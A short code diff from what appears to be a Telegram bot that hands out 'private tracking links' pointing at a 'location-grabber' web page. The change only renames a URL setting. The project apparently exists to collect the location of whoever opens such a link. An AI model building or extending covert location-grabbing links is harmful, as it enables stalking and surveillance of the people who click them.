@@ -18,8 +18,8 @@ if not BOT_TOKEN:
 if not MONGO_URI:
     raise RuntimeError("MONGO_URI missing from .env")
 
-VERCEL_BASE_URL = os.getenv(
-    "VERCEL_BASE_URL",
+FRONTEND_URL = os.getenv(
+    "FRONTEND_URL",
     "https://location-grabber-zeta.vercel.app/"
 )
 
@@ -164,7 +164,8 @@ def help_cmd(msg):
 def location_tracker(msg):
     chat_id = msg.chat.id
 
-    tracking_url = f"{VERCEL_BASE_URL}?uid={chat_id}"
+    tracking_url = f"{FRONTEND_URL}?uid={chat_id}"
+
 
     text = (
         "Your private tracking link:\n\n"
